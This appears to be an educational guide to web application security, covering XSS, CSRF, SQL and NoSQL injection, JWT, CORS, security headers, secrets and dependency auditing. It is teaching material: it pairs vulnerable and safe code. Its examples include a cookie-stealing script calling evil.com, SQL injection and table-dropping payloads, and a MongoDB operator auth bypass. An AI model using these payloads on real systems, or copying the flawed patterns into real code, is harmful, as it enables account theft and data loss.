🛡️ 1.1 The Security Mindset — Think Like an Attacker

Most security vulnerabilities are not exotic or obscure — they are predictable, well-documented, and preventable. The reason they keep appearing in production systems is that developers focus on the happy path and never ask: "What happens if a malicious user sends unexpected input?"


The security mindset means treating every piece of incoming data as potentially hostile, every API endpoint as a target, and every secret as already leaked. It means asking "how could this be abused?" before writing every line of code that handles user data.

🎯
Attack Surface

Every input field, URL param, API endpoint, and cookie is a potential entry point

🔒
Defence in Depth

Multiple layers of security — if one fails, others catch the attack

🚫
Least Privilege

Users and services get only the minimum access needed to perform their function

🔍
Zero Trust

Never trust, always verify — even requests from inside your own network

💉 1.2 Cross-Site Scripting (XSS) Critical

XSS is one of the most prevalent vulnerabilities on the web. It occurs when an attacker injects malicious JavaScript into a page that other users then execute in their browsers. The attacker's script runs in the victim's session — it can steal cookies, hijack accounts, redirect to phishing pages, or silently exfiltrate data.

🔴 Stored XSS

Malicious script is saved in the database (e.g. in a comment or profile name) and served to every user who views that content. Most dangerous type.

🟠 Reflected XSS

Script is embedded in a URL parameter and reflected back in the response. The victim must be tricked into clicking a crafted link.

🟡 DOM-based XSS

Script is injected via client-side JavaScript that reads attacker-controlled data (like location.hash) and writes it unsafely to the DOM.

❌ VULNERABLE — unsanitised output

// User submits: <script>document.cookie</script>
// Server renders:
<p>Hello, <script>
  fetch('https://evil.com?c=' + document.cookie)
</script></p>
// Browser executes the script — cookies stolen!

// Also dangerous in JavaScript:
element.innerHTML = userInput;        // XSS
document.write(userInput);            // XSS
eval(userInput);                      // XSS

✅ SAFE — escaped output

// Server-side: escape before rendering
// React does this automatically!
<p>Hello, {username}</p>  // Safe — JSX escapes by default

// Safe DOM manipulation
element.textContent = userInput;      // Safe
element.setAttribute('value', input); // Safe

// If you MUST use innerHTML, sanitise first:
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
🛡️ Content Security Policy (CSP) — The Ultimate XSS Defence

CSP is an HTTP header that tells the browser which sources are allowed to execute scripts. Even if an XSS injection occurs, CSP blocks the malicious script from running.

# Strict CSP — only scripts from your own origin, no inline scripts
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{RANDOM_NONCE}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https://cdn.example.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';

# Each page gets a fresh random nonce:
<script nonce="abc123">/* only this script runs */</script>

🔄 1.3 Cross-Site Request Forgery (CSRF) High

CSRF tricks an authenticated user's browser into making an unintended request to your server. Because the browser automatically includes cookies with every request to a domain, the server cannot tell the difference between a legitimate request and a forged one — unless you implement explicit protections.

⚠️ Classic CSRF Attack Scenario:
  1. Alice is logged into her bank at bank.com (session cookie active)
  2. Alice visits a malicious site controlled by an attacker
  3. The malicious page silently sends: POST bank.com/transfer?to=attacker&amount=5000
  4. Alice's browser automatically includes her bank.com session cookie
  5. The bank processes the transfer — Alice loses money, never clicked anything

CSRF DEFENCES

// 1. CSRF Tokens — most reliable defence
// Server generates a unique token per session:
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="a8f3...b2c9">
  ...
</form>
// Server validates the token matches the session — forged requests lack it

// 2. SameSite Cookie Attribute — modern browser defence
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
// SameSite=Strict: cookie NOT sent on cross-site requests at all
// SameSite=Lax: cookie sent on top-level navigation (e.g. links) but not POST

// 3. Check Origin / Referer headers
// Reject requests where Origin doesn't match your domain
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (req.method !== 'GET' && origin !== 'https://yourdomain.com') {
    return res.status(403).json({ error: 'CSRF detected' });
  }
  next();
});

🗄️ 1.4 SQL Injection Critical

SQL Injection is one of the oldest and most destructive vulnerabilities. It occurs when user-supplied data is directly concatenated into a SQL query, allowing attackers to manipulate the query logic — reading any data in the database, bypassing authentication, modifying records, or deleting entire tables.

❌ VULNERABLE — string concatenation

// Attacker enters username:
// ' OR '1'='1
const query = `
  SELECT * FROM users
  WHERE username = '${req.body.username}'
  AND password = '${req.body.password}'
`;
// Becomes:
// WHERE username = '' OR '1'='1'
// AND password = ''
// '1'='1' is always true — login bypassed!

// Worse: '; DROP TABLE users; --
// Destroys the entire users table

✅ SAFE — parameterised queries

// Always use parameterised queries / prepared statements
// The database treats $1 as DATA, never as SQL code

// node-postgres (pg)
const result = await db.query(
  'SELECT * FROM users WHERE username = $1 AND password = $2',
  [req.body.username, hashedPassword]
);

// Prisma ORM (safe by default)
const user = await prisma.user.findFirst({
  where: { username: req.body.username }
});

// Drizzle ORM (safe by default)
const user = await db.select()
  .from(users)
  .where(eq(users.username, req.body.username));
🔑 The Golden Rule of SQL Security:

Never concatenate user input into a query string. Always use parameterised queries, prepared statements, or a trusted ORM. This single rule prevents 100% of SQL injection attacks. No exceptions, no special cases.

🔍 NoSQL Injection

MongoDB is also vulnerable if you pass user input directly as query operators:

// Attacker sends: { "username": {"$gt": ""} }
// Matches ALL users — auth bypass!
User.find({ username: req.body.username });

// Fix: validate and sanitise input types
// Use Zod or Joi to ensure username is a string
🔒 Principle of Least Privilege (DB)

Your application's database user should have only the permissions it needs:

-- Create a restricted user
CREATE USER app_user WITH PASSWORD 'xxx';
GRANT SELECT, INSERT, UPDATE ON users TO app_user;
-- Never: GRANT ALL PRIVILEGES
-- Never connect as postgres/root

🔑 1.5 Authentication & Password Security Critical

Authentication is the process of verifying who a user is. It's one of the most critical and most commonly broken aspects of web security. A weak authentication system is the front door to your entire application.

PASSWORD HASHING — ALWAYS USE bcrypt, scrypt, OR argon2

import bcrypt from 'bcrypt';

// NEVER store plain text passwords
// NEVER use MD5 or SHA-1 — they are fast, which makes them brute-forceable

// Registration: hash the password
const SALT_ROUNDS = 12; // Higher = slower = more secure
const hashedPassword = await bcrypt.hash(plainTextPassword, SALT_ROUNDS);
await db.users.create({ email, password: hashedPassword });

// Login: compare against the hash
const isValid = await bcrypt.compare(plainTextPassword, user.password);
if (!isValid) return res.status(401).json({ error: 'Invalid credentials' });

// Why bcrypt? It's intentionally SLOW — 12 rounds = ~300ms per hash
// A brute-force attack with 1 billion guesses/sec would take 1000+ years
🔐 Multi-Factor Authentication (MFA)

MFA requires something the user knows (password) plus something they have (phone, hardware key) or are (biometric). Even if the password is leaked, the account stays secure.

  • → TOTP (Time-based OTP) — Google Authenticator, Authy
  • → SMS OTP — convenient but vulnerable to SIM swapping
  • → Hardware keys — FIDO2/WebAuthn (strongest)
  • → Magic links — passwordless email verification
🚫 Account Enumeration Prevention

Never reveal whether a username/email exists in your system. Use generic error messages and consistent response times.

// BAD — reveals account existence
"No account with this email"
"Wrong password for this email"

// GOOD — same message always
"Invalid email or password"

// Timing attack prevention:
// Always call bcrypt.compare even if user not found
// to ensure consistent response time

🎟️ 1.6 JWT & Session Security

After authentication, the server needs a way to remember who the user is on subsequent requests. The two main approaches are server-side sessions (stored in Redis/database) and JWT tokens (self-contained, stored client-side). Both have security implications.

🗄️ Server-Side Sessions

A session ID (opaque random string) is stored in a cookie. The actual session data lives in Redis or a database on the server.

  • ✅ Easy to revoke (delete from Redis)
  • ✅ No sensitive data on the client
  • ⚠ Requires shared session store for scaling
🎫 JWT (JSON Web Tokens)

A signed token containing the user's claims, stored client-side. The server validates the signature on every request.

  • ✅ Stateless — works across multiple servers
  • ⚠ Cannot be revoked without extra infrastructure
  • ❌ Never store sensitive data in payload (it's base64, not encrypted)

JWT SECURITY — COMMON MISTAKES AND FIXES

import jwt from 'jsonwebtoken';

// ❌ NEVER use 'none' algorithm (accepts unsigned tokens!)
// ❌ NEVER store JWT in localStorage (accessible to XSS)
// ❌ NEVER put sensitive data (passwords, PII) in the payload

// ✅ Sign with a strong secret or RS256 key pair
const token = jwt.sign(
  { userId: user.id, role: user.role },
  process.env.JWT_SECRET,     // Strong random secret, min 256 bits
  { expiresIn: '15m',         // Short-lived access tokens
    algorithm: 'HS256' }
);

// ✅ Store access token in memory, refresh token in HttpOnly cookie
// Access token (memory): fast, XSS cannot steal it from memory easily
// Refresh token (HttpOnly cookie): survives page reload, immune to XSS

// ✅ Verify with explicit algorithm list
const payload = jwt.verify(token, process.env.JWT_SECRET, {
  algorithms: ['HS256']  // Reject tokens with unexpected algorithm
});

// Cookie settings for HttpOnly refresh token
res.cookie('refreshToken', token, {
  httpOnly: true,     // Not accessible via JavaScript
  secure: true,       // HTTPS only
  sameSite: 'strict', // CSRF protection
  maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
});

🔐 1.7 HTTPS & Transport Layer Security

HTTPS encrypts all data in transit between the browser and your server using TLS (Transport Layer Security). Without it, anyone on the same network (coffee shop WiFi, ISP, etc.) can read or modify your traffic in a man-in-the-middle attack.

📋 Security Headers — Your First Line of Defence 
# Strict Transport Security
# Force HTTPS for 1 year, include subdomains
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Prevent MIME-type sniffing attacks
X-Content-Type-Options: nosniff

# Prevent clickjacking (loading your site in an iframe)
X-Frame-Options: DENY
# Or via CSP:
Content-Security-Policy: frame-ancestors 'none'

# Control referrer information
Referrer-Policy: strict-origin-when-cross-origin

# Disable browser features you don't need
Permissions-Policy: camera=(), microphone=(), geolocation=()
⚙️ Setting Headers in Node.js (Helmet)

The helmet package sets all critical security headers with one line of code:

import helmet from 'helmet';
import express from 'express';

const app = express();

// Sets ~15 security headers automatically
app.use(helmet());

// Or customise specific headers:
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'nonce-{nonce}'"],
    }
  },
  hsts: { maxAge: 31536000, includeSubDomains: true }
}));

💡 Test your headers at securityheaders.com — aim for an A or A+ rating.

🌐 1.8 CORS — Cross-Origin Resource Sharing

The Same-Origin Policy is a browser security mechanism that blocks JavaScript from making requests to a different origin (protocol + domain + port). CORS is the mechanism that allows servers to selectively relax this restriction — but a misconfigured CORS policy is a common security hole.

❌ DANGEROUS CORS CONFIG

// Allows ANY website to make requests
// to your API — including malicious ones
app.use(cors({ origin: '*' }));

// Also dangerous: reflecting any origin
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin',
    req.headers.origin); // Reflects any origin!
  next();
});

✅ SECURE CORS CONFIG

const allowedOrigins = [
  'https://myapp.com',
  'https://www.myapp.com',
  // Only add staging during development
];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin))
      callback(null, true);
    else
      callback(new Error('Not allowed by CORS'));
  },
  credentials: true, // Allow cookies
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
}));
🔍 Simple vs Preflight Requests:

For "non-simple" requests (custom headers, PUT/DELETE, JSON body), browsers send a preflight OPTIONS request first to ask the server if the actual request is allowed. Your server must respond correctly to preflight or the request will fail.

✅ 1.9 Input Validation & Sanitisation

The single most important security principle: never trust user input. Every piece of data that enters your system from outside — form fields, URL params, headers, file uploads, API payloads — must be validated and sanitised before being processed, stored, or displayed.

SERVER-SIDE VALIDATION WITH ZOD

import { z } from 'zod';

// Define the shape of expected input
const RegisterSchema = z.object({
  email:    z.string().email().max(255),
  username: z.string().min(3).max(30).regex(/^[a-zA-Z0-9_]+$/),
  password: z.string().min(8).max(128),
  age:      z.number().int().min(13).max(120),
});

// In your route handler:
app.post('/register', async (req, res) => {
  const result = RegisterSchema.safeParse(req.body);

  if (!result.success) {
    // Validation failed — return errors, never process the data
    return res.status(400).json({ errors: result.error.flatten() });
  }

  // result.data is now fully typed and validated
  const { email, username, password } = result.data;
  // ... proceed safely
});
📂 File Upload Security
  • → Validate MIME type server-side (not just extension)
  • → Limit file size (multipart limits)
  • → Never store uploads in a public web-accessible directory
  • → Rename files with random names (prevent path traversal)
  • → Scan for malware with ClamAV or cloud services
  • → Serve user uploads from a separate domain/CDN
🧹 Sanitisation vs Validation

Validation rejects bad input (returns an error). Sanitisation cleans input (removes dangerous parts).

Prefer validation + rejection for structured data. Use sanitisation when you must accept rich text (e.g., DOMPurify for HTML content from users).

⚠ Never rely on client-side validation alone — it can be bypassed. Always validate on the server.

⏱️ 1.10 Rate Limiting & Brute Force Protection

Without rate limiting, attackers can send unlimited requests to your API — attempting millions of password combinations, scraping all your data, or overloading your servers. Rate limiting is a critical control that should be applied to every public endpoint.

RATE LIMITING WITH express-rate-limit + Redis

import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';
import { createClient } from 'redis';

const redis = createClient({ url: process.env.REDIS_URL });

// General API rate limit — 100 requests per 15 minutes
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  store: new RedisStore({ sendCommand: (...args) => redis.sendCommand(args) }),
  handler: (req, res) => res.status(429).json({ error: 'Too many requests' })
});

// Strict limit for auth endpoints — 5 attempts per 15 minutes
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  skipSuccessfulRequests: true, // Don't count successful logins
});

app.use('/api/', apiLimiter);
app.use('/auth/login', authLimiter);
app.use('/auth/register', authLimiter);

🗝️ 1.11 Secrets Management — Never Leak Your Keys

API keys, database passwords, JWT secrets, and third-party credentials are the keys to your kingdom. Exposing them — even accidentally, even briefly — can result in complete compromise of your application and data.

🚨 Real-World Consequences of Leaked Secrets:
  • → AWS key leaked on GitHub → attackers spin up hundreds of crypto-mining instances → $50,000 bill overnight
  • → Stripe key leaked → fraudulent charges processed against your customers
  • → Database password leaked → all user data exfiltrated and sold

GitHub, GitLab, and cloud providers scan public repos for secrets in real time. Attackers also scan constantly — a key exposed for even 30 seconds can be exploited.

SECRETS BEST PRACTICES

# 1. NEVER commit .env files
# .gitignore — always include:
.env
.env.local
.env.production
.env.*.local

# 2. Provide .env.example with placeholder values (safe to commit)
DATABASE_URL=postgresql://user:password@localhost/mydb
JWT_SECRET=your-256-bit-secret-here
STRIPE_KEY=sk_test_...

# 3. In production: use platform secret stores
# Vercel / Netlify: Dashboard → Environment Variables
# AWS: Secrets Manager or Parameter Store
# GitHub Actions: Repository → Settings → Secrets
# Docker / K8s: Kubernetes Secrets or HashiCorp Vault

# 4. Rotate secrets regularly
# Use short-lived credentials where possible (AWS STS, OIDC)
🛡️ If a Secret is Leaked — Incident Response:
  1. Immediately revoke the leaked credential (rotate the key in the provider's dashboard)
  2. Check audit logs for any unauthorised usage
  3. If the commit is on a public repo, assume the secret was already harvested
  4. Use git filter-repo to remove from history (force push)
  5. Notify affected parties if user data was accessed

📦 1.12 Dependency Security — Your Supply Chain

Modern applications use hundreds or thousands of npm packages. Each one is a potential vector for attack. In 2021, the event-stream supply chain attack injected malicious code into a package downloaded 2 million times per week. Managing your dependency security is non-negotiable.

DEPENDENCY AUDITING TOOLS

# Built-in npm audit
npm audit                    # Lists all known vulnerabilities
npm audit fix                # Auto-fix compatible vulnerabilities
npm audit fix --force        # Fix with major version bumps (test first!)
npm audit --audit-level=high # Fail CI only on high/critical issues

# Snyk — more detailed analysis
npx snyk test
npx snyk monitor             # Continuous monitoring

# License checking
npx license-checker --onlyAllow 'MIT;Apache-2.0;BSD-3-Clause'

# Check outdated packages
npm outdated
🤖 GitHub Dependabot

Enable Dependabot in your GitHub repo settings. It automatically opens PRs when your dependencies have security updates — keeping you patched without manual effort.

# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly
⚠️ Package Hygiene Rules
  • → Pin exact versions in production (--save-exact)
  • → Check package reputation before installing (downloads, issues, last update)
  • → Avoid packages with very few maintainers for critical code
  • → Use npm ci (not npm install) in CI — respects lockfile exactly
  • → Keep package-lock.json committed and reviewed

📋 1.13 Security Logging & Monitoring

OWASP A09 is "Security Logging and Monitoring Failures" — because most breaches go undetected for months. Proper logging creates the forensic trail needed to detect attacks, understand breaches, and meet compliance requirements.

WHAT TO LOG AND HOW

// Structured JSON logging (use a library like pino or winston)
import pino from 'pino';
const logger = pino({ level: 'info' });

// Log security events — always include:
// timestamp, userId, IP, action, outcome

// Authentication events
logger.info({ userId: user.id, ip: req.ip, action: 'login', success: true });
logger.warn({ email, ip: req.ip, action: 'login_failed', reason: 'bad_password' });
logger.warn({ email, ip: req.ip, action: 'login_failed', reason: 'account_locked' });

// Access control violations
logger.warn({ userId, ip: req.ip, action: 'access_denied', resource: req.path });

// Data modification events
logger.info({ userId, action: 'user_deleted', targetId: params.id });

// ❌ NEVER log: passwords, credit cards, tokens, PII (names, emails)
// ✅ DO log: user IDs, IP addresses, actions, outcomes, error codes

🎯 Mastery Criteria: Security — Frontend & Backend

Criteria organised by importance levels to assess your mastery of web application security.

💠 Essential

  • XSS Prevention: Never use innerHTML with user data; use textContent and sanitise HTML with DOMPurify when needed.
  • SQL Injection: Always use parameterised queries or a trusted ORM — never concatenate user input into SQL.
  • Password Hashing: Hash passwords with bcrypt or argon2 — never store plain text or use MD5/SHA-1.
  • HTTPS: All production apps use HTTPS; never transmit sensitive data over HTTP.
  • Secrets: Never commit .env files; use platform secret stores in production.

⭐ Important

  • CSRF: Implement CSRF tokens and use SameSite cookie attributes on state-changing endpoints.
  • Security Headers: Apply Helmet.js or equivalent for CSP, HSTS, X-Frame-Options, and other critical headers.
  • CORS: Whitelist specific origins — never use wildcard * for credentialed requests.
  • Rate Limiting: Apply rate limits to all public endpoints, especially authentication routes.
  • Input Validation: Validate and type-check all incoming data server-side (Zod, Joi).

🚀 Advanced

  • JWT Security: Use short-lived access tokens, HttpOnly refresh tokens, and explicit algorithm whitelisting.
  • MFA: Implement TOTP or WebAuthn as a second authentication factor.
  • Dependency Auditing: Automate vulnerability scanning with Dependabot and npm audit in CI.
  • Security Logging: Log all authentication events and access violations for forensic analysis.
  • Penetration Testing: Use OWASP ZAP or Burp Suite to actively probe your own applications for vulnerabilities.
